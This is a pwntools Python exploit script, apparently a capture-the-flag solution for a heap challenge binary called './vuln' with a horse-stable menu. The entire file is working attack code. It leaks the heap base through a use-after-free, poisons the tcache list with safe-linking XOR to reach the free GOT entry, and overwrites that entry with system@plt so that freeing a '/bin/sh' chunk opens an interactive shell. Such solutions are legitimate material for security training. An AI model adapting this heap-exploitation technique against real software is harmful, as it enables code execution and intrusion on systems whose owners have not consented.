#!/usr/bin/python3
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

def edit_horse(idx, data, spot):
    io.sendlineafter(b'Choice: ', b'0')
    io.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    io.sendlineafter(b'Enter a string of 16 characters: ', data)
    io.sendlineafter(b'New spot? ', str(spot).encode())

def add_horse(idx, size, data):
    io.sendlineafter(b'Choice: ', b'1')
    io.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    io.sendlineafter(b'Horse name length (16-256)? ', str(size).encode())
    io.sendlineafter(b'characters: ', data)

def free_horse(idx):
    io.sendlineafter(b'Choice: ', b'2')
    io.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())

def race_horse():
    io.sendlineafter(b'Choice: ', b'3')

def exploit():
    # leak heap
    add_horse(0, 0x10, b'A' * 0x10)
    free_horse(0)
    add_horse(0, 0x10, b'\xFF')
    # fill system GOT
    for i in range(1, 5):
        add_horse(i, 0x10, b'X' * 0x10)
    race_horse()
    io.recvuntil(b' ')
    heap_base = u32(io.recvn(10).strip().ljust(4, b'\x00')) << 12
    log.info('heap base: %#x', heap_base)
    io.recvuntil(b'WINNER:')
    # tcache list
    add_horse(10, 0x18, b'A' * 0x18)
    add_horse(11, 0x18, b'B' * 0x18)
    free_horse(10)
    free_horse(11)
    # change tcache bins to free GOT
    free_got = 0x404010
    edit_horse(11, p64(free_got ^ (heap_base >> 12)) + p64(heap_base + 0x10), 1)
    add_horse(12, 0x18, b'/bin/sh\0' + b'C' * 0x10)
    # change free GOT to system
    ret_gadget = 0x401E48
    system_plt = 0x401090
    payload = flat(
        p64(0),
        p64(system_plt),
        p64(ret_gadget),
    )
    add_horse(13, 0x18, payload)
    free_horse(12)
    io.interactive()

if __name__ == '__main__':
    exploit()
